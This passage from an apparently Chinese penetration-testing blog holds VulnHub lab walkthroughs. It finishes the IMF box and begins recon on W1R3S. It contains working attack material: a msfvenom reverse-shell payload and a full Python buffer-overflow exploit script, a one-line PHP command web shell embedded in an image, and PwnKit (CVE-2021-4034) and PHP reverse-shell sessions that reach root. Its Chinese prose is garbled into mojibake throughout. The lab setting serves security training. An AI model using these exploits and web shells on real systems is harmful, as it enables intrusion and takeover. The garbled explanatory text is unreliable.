192.168.135.146:80      192.168.135.141:46088   ESTABLISHED<br><span class="hljs-meta">$</span><span class="bash"> cat /etc/services | grep 7788</span><br>agent           7788/tcp                        # Agent service<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ps -aux <span class="hljs-comment"># æŸ¥è¯¢è¿›ç¨‹</span></span><br><span class="hljs-meta">$</span><span class="bash"> netstat -tulnp | grep 8888</span><br></code></pre></td></tr></table></figure><p><strong>6ã€å½“å‰ç›®å½•æ‰§è¡Œ php è„šæœ¬å¼€å¯ç®€æ˜“ web æœåŠ¡å™¨ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> php -S 192.168.135.141:4488</span><br></code></pre></td></tr></table></figure><p><strong>7ã€ææƒ</strong></p><p>é€šè¿‡ç¼“å†²åŒºæº¢å‡º agent è¿›ç¨‹è·å¾— root æƒé™ã€‚</p><p>ä½¿ç”¨ msfvenom åˆ›å»ºä¸€ä¸ª shellcodeï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.135.141 LPORT=6666 -f python -b <span class="hljs-string">&quot;\x00\x0a\x0d&quot;</span></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> -p é€‰æ‹©payload(æ­¤æ¬¡å› ä¸ºagentæ˜¯32ä½ï¼Œæ‰€ä»¥ä½¿ç”¨X86)</span><br><span class="hljs-meta">#</span><span class="bash"> LHOST ã€LPORT ç›‘æµ‹ä¸»æœºIPå’Œç«¯å£</span><br><span class="hljs-meta">#</span><span class="bash"> -f æŒ‡å®šç”Ÿæˆxxxæ ¼å¼</span><br><span class="hljs-meta">#</span><span class="bash"> -b åœ¨ç”Ÿæˆçš„ç¨‹åºä¸­é¿å…å‡ºç°çš„å€¼</span><br><span class="hljs-meta">#</span><span class="bash"> \x00 == 0x00 ASCIIæ§åˆ¶å­—ç¬¦è¡¨ä¸­å¯¹åº” NULL (ç©ºå­—ç¬¦)</span><br><span class="hljs-meta">#</span><span class="bash"> \x0a == 0X0a ASCIIæ§åˆ¶å­—ç¬¦è¡¨ä¸­å¯¹åº” LF ï¼ˆæ¢è¡Œé”®ï¼‰</span><br><span class="hljs-meta">#</span><span class="bash"> \x0b == 0x0b ASCIIæ§åˆ¶å­—ç¬¦è¡¨ä¸­å¯¹åº” VT (å‚ç›´å®šä½ç¬¦å·)</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å¤§ä½¬å†™çš„pyè„šæœ¬ï¼Œå°†ç”Ÿæˆçš„å†…å®¹ï¼Œæ›¿æ¢ python è„šæœ¬å†…å®¹ï¼š<a href="https://github.com/jessekurrus/agentsploit">https://github.com/jessekurrus/agentsploit</a></p><p>å°† shellcode è¿›è¡Œæ›¿æ¢ï¼Œä¸‹é¢éƒ¨åˆ†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">buf =  &quot;&quot;<br>buf += &quot;\xba\xf9\x03\x07\x8f\xd9\xe5\xd9\x74\x24\xf4\x5b\x31&quot;<br>buf += &quot;\xc9\xb1\x12\x31\x53\x12\x03\x53\x12\x83\x12\xff\xe5&quot;<br>buf += &quot;\x7a\xd5\xdb\x1d\x67\x46\x9f\xb2\x02\x6a\x96\xd4\x63&quot;<br>buf += &quot;\x0c\x65\x96\x17\x89\xc5\xa8\xda\xa9\x6f\xae\x1d\xc1&quot;<br>buf += &quot;\xaf\xf8\xdf\x1e\x58\xfb\xdf\x31\xf8\x72\x3e\x81\x9e&quot;<br>buf += &quot;\xd4\x90\xb2\xed\xd6\x9b\xd5\xdf\x59\xc9\x7d\x8e\x76&quot;<br>buf += &quot;\x9d\x15\x26\xa6\x4e\x87\xdf\x31\x73\x15\x73\xcb\x95&quot;<br>buf += &quot;\x29\x78\x06\xd5&quot;<br></code></pre></td></tr></table></figure><p>ç›‘å¬ç«¯å£4448ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4448</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œ exp ä»£ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python exp.py 192.168.135.146 7788</span><br></code></pre></td></tr></table></figure><p>è¿æ¥æˆåŠŸï¼Œè®¿é—®å¾—åˆ° <strong>flag6ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs flag6">flag6&#123;R2gwc3RQcm90MGMwbHM=&#125;<br></code></pre></td></tr></table></figure><p><strong>8ã€å›¾ç‰‡é©¬ï¼š</strong></p><p>åœ¨phpæ–‡ä»¶é‡Œå†™å…¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$s</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]; <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$s</span>`; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å†ä½¿ç”¨ windows å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> copy /b æ–‡ä»¶1+æ–‡ä»¶2 æ–‡ä»¶3</span><br></code></pre></td></tr></table></figure><p>å°†phpæ–‡ä»¶å’Œå›¾åƒæ–‡ä»¶åˆå¹¶ã€‚ </p><p><strong>9ã€edbè°ƒè¯•ææƒ</strong></p><p>ä½¿ç”¨edbå¯¹ç¨‹åºè¿›è¡Œæµ‹è¯•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> edb --run agent</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œç¨‹åºåå…ˆé€‰æ‹© <code>3.submit report</code> è¿›è¡Œæµ‹è¯•ï¼š</p><p>è¿è¡Œ<code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1024</code>æ¥è·å–1024ä¸ªæµ‹è¯•å­—ç¬¦ï¼Œç„¶åè¾“å…¥å­—ç¬¦ï¼š</p><p><img src="https://image.3001.net/images/20180710/1531208091689.png!small" alt="A.png"></p><p>å†ç”¨ <code>/usr/share/metasploit-Â­â€framework/tools/pattern_offset.rb -q 41366641</code> åæŸ¥ï¼š</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">[*] <span class="hljs-built_in">Exact</span> <span class="hljs-built_in">match</span> at <span class="hljs-built_in">offset</span> <span class="hljs-number">168</span><br></code></pre></td></tr></table></figure><p>å‘ç°ç¨‹åºåœ¨ç¬¬168ä¸ªå­—ç¬¦å¤„æº¢å‡ºï¼Œå†ç”Ÿæˆ A*168+B*4+C*1000 çš„æµ‹è¯•å­—ç¬¦ï¼š</p><p><img src="https://image.3001.net/images/20180710/15312081152906.png!small" alt="B.png"></p><p>å‘ç° EAX å˜æˆäº†ä¸€å † Aï¼Œçœ‹èƒ½ä¸èƒ½æ‰¾åˆ° <code>call eax</code> ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 22:37:10nasm &gt; call eax 00000000 FFD0 call eax</span><br></code></pre></td></tr></table></figure><p>edbé‡Œæœç´¢ FFD0ï¼Œæ‰¾åˆ°åœ°å€ <code>0x08048563</code> ï¼š</p><p><img src="https://image.3001.net/images/20180710/15312081667844.png!small" alt="C.png"></p><p>é‡å¯ç¨‹åºå‘ç°åœ°å€ä¸å˜ï¼Œå°±é€‰è¿™ä¸ªåœ°å€æ¥ä½œä¸ºEIPçš„å€¼ã€‚</p><p>ç”Ÿæˆshellï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.190.1 LPORT=6666 -f python -b <span class="hljs-string">&quot;\x00\x0a\x0d&quot;</span> &gt; ATK.py</span>       <br>[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload                         [-] No arch selected, selecting arch: x86 from the payload                                                   Found 10 compatible encoders                                                                                 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai                                         x86/shikata_ga_nai succeeded with size 95 (iteration=0)                                                     x86/shikata_ga_nai chosen with final size 95                                                                 Payload size: 95 bytes                                                                                       Final size of python file: 470 bytes<br></code></pre></td></tr></table></figure><p>ç¼–å†™expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><br>host = <span class="hljs-string">&quot;192.168.135.146&quot;</span><br>port = <span class="hljs-number">7788</span><br><br>ret = <span class="hljs-string">&quot;\x63\x85\x04\x08\n&quot;</span><br><br>buf =  <span class="hljs-string">&quot;&quot;</span><br>buf += <span class="hljs-string">&quot;\xbb\xa3\xdc\x2d\x95\xdb\xc2\xd9\x74\x24\xf4\x5f\x33&quot;</span><br>buf += <span class="hljs-string">&quot;\xc9\xb1\x12\x31\x5f\x12\x03\x5f\x12\x83\x64\xd8\xcf&quot;</span><br>buf += <span class="hljs-string">&quot;\x60\x5b\x3a\xf8\x68\xc8\xff\x54\x05\xec\x76\xbb\x69&quot;</span><br>buf += <span class="hljs-string">&quot;\x96\x45\xbc\x19\x0f\xe6\x82\xd0\x2f\x4f\x84\x13\x47&quot;</span><br>buf += <span class="hljs-string">&quot;\x90\xde\x5a\x96\x78\x1d\xa3\x82\x72\xa8\x42\x02\xe4&quot;</span><br>buf += <span class="hljs-string">&quot;\xfa\xd5\x31\x5a\xf9\x5c\x54\x51\x7e\x0c\xfe\x04\x50&quot;</span><br>buf += <span class="hljs-string">&quot;\xc2\x96\xb0\x81\x0b\x04\x28\x57\xb0\x9a\xf9\xee\xd6&quot;</span><br>buf += <span class="hljs-string">&quot;\xaa\xf5\x3d\x98&quot;</span><br>buf += <span class="hljs-string">&quot;A&quot;</span> * (<span class="hljs-number">168</span> - <span class="hljs-built_in">len</span>(buf))<br>buf += ret<br><br>con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>con.connect((host, port))<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Connected&quot;</span><br><br><span class="hljs-built_in">print</span> con.recv(<span class="hljs-number">1024</span>)<br>con.send(<span class="hljs-string">b&quot;48093572\n&quot;</span>)<br><span class="hljs-built_in">print</span> con.recv(<span class="hljs-number">1024</span>)<br>con.send(<span class="hljs-string">b&quot;3\n&quot;</span>)<br><span class="hljs-built_in">print</span> con.recv(<span class="hljs-number">1024</span>)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Sending evil buffer...&quot;</span><br>con.send(buf)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;done&quot;</span><br></code></pre></td></tr></table></figure><p>æ‰“å¼€ nc ç›‘å¬ 6666 ç«¯å£,ç„¶åå°±å¾—åˆ°äº† root æƒé™ã€‚</p><p><strong>10ã€cve-2021-4034ï¼š</strong></p><blockquote><p>ä¸åŒçš„ shell è¿è¡Œç»“æœä¸ä¸€è‡´ï¼Œphp-reverse-shell.php å¯ä»¥æˆåŠŸï¼Œweevely ç”Ÿæˆçš„ cd5bb348e612.gif ä¸å¯ä»¥æˆåŠŸ ã€‚</p></blockquote><p><strong>cd5bb348e612.gifï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> weevely http://192.168.135.146/imfadministrator/uploads/cd5bb348e612.gif <span class="hljs-built_in">test</span></span><br><br>[+] weevely 4.0.1<br><br>[+] Target:     www-data@imf:/var/www/html/imfadministrator/uploads<br>[+] Session:    /home/kali/.weevely/sessions/192.168.135.146/cd5bb348e612_0.session<br>[+] Shell:      System shell<br><br>[+] Browse the filesystem or execute commands starts the connection<br>[+] to the target. Type :help for more information.<br><br>www-data@imf:/var/www/html/imfadministrator/uploads $ ls<br>a.out<br>cd5bb348e612.gif<br>cve-2021-4034-poc2.c<br>flag5_abc123def.txt<br>php-reverse-shell.php<br>www-data@imf:/var/www/html/imfadministrator/uploads $ ./a.out<br>Current User before execute exploit<br><span class="hljs-meta">hacker@victim$</span><span class="bash">whoami: www-data</span><br>Exploit written by @luijait (0x6c75696a616974)<br>[+] Enjoy your root if exploit was completed succesfully<br>bash: cannot set terminal process group (1288): Inappropriate ioctl for device<br>bash: no job control in this shell<br>root@imf:/var/www/html/imfadministrator/uploads# exit<br>www-data@imf:/var/www/html/imfadministrator/uploads $ <br><br><br>www-data@imf:/var/www/html/imfadministrator/uploads $ ./a.out<br>GLib: Cannot convert message: Could not open converter from &#x27;UTF-8&#x27; to &#x27;PWNKIT&#x27;<br>pkexec must be setuid root<br>www-data@imf:/var/www/html/imfadministrator/uploads $ <br></code></pre></td></tr></table></figure><p><strong>php-reverse-shell.phpï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span><br>listening on [any] 1234 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.146] 59416<br>Linux imf 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux<br> 10:12:02 up 16 min,  0 users,  load average: 0.54, 0.60, 0.46<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /var/www/html/imfadministrator/uploads</span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>GCONV_PATH=.<br>a.out<br>cd5bb348e612.gif<br>cve-2021-4034-poc2.c<br>flag5_abc123def.txt<br>php-reverse-shell.php<br>tmp<br><span class="hljs-meta">$</span><span class="bash"> ./a.out</span><br>Current User before execute exploit<br><span class="hljs-meta">hacker@victim$</span><span class="bash">whoami: www-data</span><br>Exploit written by @luijait (0x6c75696a616974)mkdir: cannot create directory &#x27;GCONV_PATH=.&#x27;: File exists<br>mkdir: cannot create directory &#x27;tmp&#x27;: File exists<br><br>[+] Enjoy your root if exploit was completed succesfully<br>bash: cannot set terminal process group (1288): Inappropriate ioctl for device<br>bash: no job control in this shell<br>root@imf:/var/www/html/imfadministrator/uploads# whoami<br>whoami<br>root<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>W1R3Sï¼š1.0.1</title>
    <link href="/2022/05/01/Penetration/Vulnhub/Part-1/0x02%20W1R3S/"/>
    <url>/2022/05/01/Penetration/Vulnhub/Part-1/0x02%20W1R3S/</url>
    
    <content type="html"><![CDATA[<h1 id="0x02-W1R3S-1-0-1-vulnhub"><a href="#0x02-W1R3S-1-0-1-vulnhub" class="headerlink" title="0x02 W1R3S: 1.0.1~vulnhub"></a>0x02 W1R3S: 1.0.1~vulnhub</h1><blockquote><p>é¶æœºåœ°å€ï¼š<a href="https://www.vulnhub.com/entry/w1r3s-101,220/">W1R3S: 1.0.1 ~ VulnHub</a></p><p>ç¯å¢ƒä¿¡æ¯ï¼š</p><ul><li>æ”»å‡»æœº IPï¼š192.168.135.141</li><li>é¶æœº IPï¼š192.168.135.145</li></ul></blockquote><h2 id="ä¸€ã€ä¿¡æ¯æ”¶é›†"><a href="#ä¸€ã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¸€ã€ä¿¡æ¯æ”¶é›†"></a>ä¸€ã€ä¿¡æ¯æ”¶é›†</h2><h3 id="1ã€ä¸»æœºæ¢æµ‹"><a href="#1ã€ä¸»æœºæ¢æµ‹" class="headerlink" title="1ã€ä¸»æœºæ¢æµ‹"></a>1ã€ä¸»æœºæ¢æµ‹</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24    <span class="hljs-comment"># æ‰«æè¯¥ç½‘æ®µä¸Šæ´»è·ƒçš„ä¸»æœº</span></span><br></code></pre></td></tr></table></figure><p><strong>arp-scan å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo arp-scan -l</span>                                                                                           <br>Interface: eth0, type: EN10MB, MAC: 00:0c:29:38:c2:06, IPv4: 192.168.135.141<br>Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.135.1   00:50:56:c0:00:08       VMware, Inc.<br>192.168.135.2   00:50:56:eb:65:60       VMware, Inc.<br>192.168.135.145 00:0c:29:9e:ec:6d       VMware, Inc.<br>192.168.135.254 00:50:56:e6:a4:73       VMware, Inc.<br><br>4 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.9.7: 256 hosts scanned in 1.978 seconds (129.42 hosts/sec). 4 responded<br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°é¶æœº ipï¼š192.168.135.145</strong></p><h3 id="2ã€ç«¯å£æ‰«æ"><a href="#2ã€ç«¯å£æ‰«æ" class="headerlink" title="2ã€ç«¯å£æ‰«æ"></a>2ã€ç«¯å£æ‰«æ</h3><p><strong>nmap å‘½ä»¤ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sS -A -p- 192.168.135.145     <span class="hljs-comment"># å…¨ç«¯å£æ‰«æ</span></span><br></code></pre></td></tr></table></figure><p><strong>ç®€å•çš„ç«¯å£æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.145</span><br></code></pre></td></tr></table></figure><p><strong>å…¨é¢æ‰«æï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.145</span><br></code></pre></td></tr></table></figure><p><strong>å¾—åˆ°ç›®æ ‡ç«¯å£ä¿¡æ¯</strong></p><div class="table-container"><table><thead><tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>å…¶ä»–</th></tr></thead><tbody><tr><td>21/tcp</td><td>open</td><td>ftp</td><td>Anonymous FTP login allowed</td></tr><tr><td>22/tcp</td><td>open</td><td>ssh</td><td></td></tr><tr><td>80/tcp</td><td>open</td><td>http</td><td></td></tr><tr><td>3306/tcp</td><td>open</td><td>mysql</td></tr></tbody></table></div><h3 id="3ã€ç«¯å£æ¢æµ‹"><a href="#3ã€ç«¯å£æ¢æµ‹" class="headerlink" title="3ã€ç«¯å£æ¢æµ‹"></a>3ã€ç«¯å£æ¢æµ‹</h3><p><strong>21ç«¯å£</strong></p><blockquote><p>FTP çš„åŒ¿åç™»å½•ä¸€èˆ¬æœ‰ä¸‰ç§ï¼š</p><ul><li>ç”¨æˆ·åï¼šanonymousï¼›å¯†ç ï¼šEmailæˆ–è€…ä¸ºç©º</li><li>ç”¨æˆ·åï¼šFTPï¼›å¯†ç ï¼šFTPæˆ–è€…ä¸ºç©º</li><li>ç”¨æˆ·åï¼šUSERï¼›å¯†ç ï¼špass</li></ul><p>ftp å‘½ä»¤å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_38526635/article/details/82147980">FTPå¸¸è§å‘½ä»¤è¯¦è§£_luckycyongçš„åšå®¢-CSDNåšå®¢</a></p></blockquote><p>ftp å­˜åœ¨åŒ¿åç™»é™†ï¼ˆç”¨æˆ·åanonymousï¼Œå¯†ç ä¸ºç©ºï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ftp 192.168.135.145</span><br></code></pre></td></tr></table></figure><p>ä¸‹è½½æ•´ä¸ªftpç›®å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget ftp://192.168.135.145/* --ftp-user=anonymous --ftp-password= -r</span> <br></code></pre></td></tr></table></figure><p>æ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ç”¨çš„ä¿¡æ¯ã€‚</p><p><strong>22ç«¯å£</strong></p><p>æš‚æ—¶æœªå¾—åˆ° username å’Œ password çš„ç›¸å…³ä¿¡æ¯ï¼Œæ— æ³•ä½¿ç”¨ sshã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh 192.168.135.145</span><br>----------------------<br>Think this is the way?<br>----------------------<br>Well,........possibly.<br>----------------------<br>kali@192.168.135.145&#x27;s password: <br></code></pre></td></tr></table></figure><p><strong>3306ç«¯å£</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> mysql -h 192.168.135.145 -P 3306 -uroot -p</span><br>Enter password: <br>ERROR 1130 (HY000): Host &#x27;192.168.135.141&#x27; is not allowed to connect to this MySQL server<br></code></pre></td></tr></table></figure><p><strong>80ç«¯å£</strong></p><p>dirb çˆ†ç ´ç›®å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.145:80</span><br></code></pre></td></tr></table></figure><p>gobuster çˆ†ç ´ç›®å½•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.145/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> gobuster dir -u http://192.168.135.145/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -n -e</span><br></code></pre></td></tr></table></figure><blockquote><p>gobuster ï¼š<a href="https://www.kali.org/tools/gobuster/">gobuster | Kali Linux Tools</a></p><p>GitHubï¼š<a href="https://github.com/OJ/gobuster">OJ/gobuster: Directory/File, DNS and VHost busting tool written in Go</a></p><p>gobuster ä½¿ç”¨å‚è€ƒï¼š<a href="https://blog.csdn.net/nzjdsds/article/details/86756828">GOBUSTER - ç›®å½•/æ–‡ä»¶å’ŒDNSçˆ†ç ´å·¥å…·ã€‚_å¤§æ–¹å­çš„åšå®¢-CSDNåšå®¢</a></p></blockquote><p>æ‰¾åˆ°äº†å‡ ä¸ªé‡è¦çš„ç›®å½•ï¼š/administrator å’Œ /wordpress ã€‚</p><p>å…ˆè®¿é—® <a href="http://192.168.135.145/administratorï¼Œå‘ç°è¿™ä¸ªæ˜¯">http://192.168.135.145/administratorï¼Œå‘ç°è¿™ä¸ªæ˜¯</a> Cuppa CMS çš„å®‰è£…è®¾ç½®ï¼ŒçŒœæµ‹å¯èƒ½å·²ç»å®‰è£…äº† Cuppa CMS ã€‚</p><p>å†è®¿é—® <a href="http://192.168.135.145/wordpressï¼Œå‘ç°æ‰“ä¸å¼€ï¼Œç›´æ¥">http://192.168.135.145/wordpressï¼Œå‘ç°æ‰“ä¸å¼€ï¼Œç›´æ¥</a> wpscan æ‰«æï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.145/wordpress</span><br>Scan Aborted: The URL supplied redirects to http://localhost/wordpress/. Use the --ignore-main-redirect option to ignore the redirection and scan the target, or change the --url option value to the redirected URL.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://localhost/wordpress/</span><br>Scan Aborted: The url supplied &#x27;http://localhost/wordpress/&#x27; seems to be down (Couldn&#x27;t connect to server)<br></code></pre></td></tr></table></figure><p>å‘ç°æ˜¯ä¸ªé‡å®šå‘ï¼Œé‡å®šå‘åˆ°äº†æœ¬åœ°ï¼Œé€‰æ‹©å¿½ç•¥é‡å®šå‘ä¹‹åï¼Œæ˜¾ç¤ºæ²¡æœ‰è¿è¡Œ wordpressï¼Œä¿®æ”¹ hosts æ–‡ä»¶åä»æ— æ³•è¿›è¡Œæ‰«æ ã€‚</p><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>æŸ¥æ‰¾ Cuppa æ¼æ´è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 